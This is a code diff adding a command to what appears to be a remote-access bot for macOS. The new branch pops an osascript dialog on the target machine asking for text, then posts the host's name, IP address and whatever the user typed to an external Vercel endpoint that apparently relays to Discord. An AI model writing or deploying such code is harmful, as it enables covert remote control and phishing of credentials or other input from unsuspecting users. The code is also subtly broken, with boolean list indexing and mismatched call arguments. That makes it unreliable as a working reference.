@@ -223,6 +223,27 @@ while True:
                                     except KeyboardInterrupt:
                                         continue
                                     continue
+                            elif localcmd[1] == 'askdialog' or localcmd[1] == 'asklog' or localcmd == 'question':
+                                if localcmd[2<len(localcmd)]:
+                                    r = system(f'osascript -e \'display dialog "{localcmd[2]}" default answer ""\' -e \'text returned of result\' -e \'\'', shell=True, stdout=PIPE, stderr=PIPE)
+                                    cmdout, cmderr = r.communicate()
+                                    try:
+                                        post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ {localcmd}`` ```{cmdout.decode()}```")
+                                    except:
+                                        try:
+                                            post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ {localcmd}`` ```Failed to ask with dialog```")
+                                        except KeyboardInterrupt:
+                                            continue
+                                        continue
+                                else:
+                                    try:
+                                        post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ {localcmd}`` ```Please do question argument```")
+                                    except KeyboardInterrupt:
+                                        continue
+                                    continue
+
+
+                                    
                             elif localcmd[1] == 'notify' or localcmd[1] == 'notification':
                                 if localcmd[4>len(localcmd)]:
                                     if ossystem(f"osascript -e 'display notification \"{localcmd[2]}\" with title \"{localcmd[3]}\" subtitle \"{localcmd[4]}\"'") == 0:
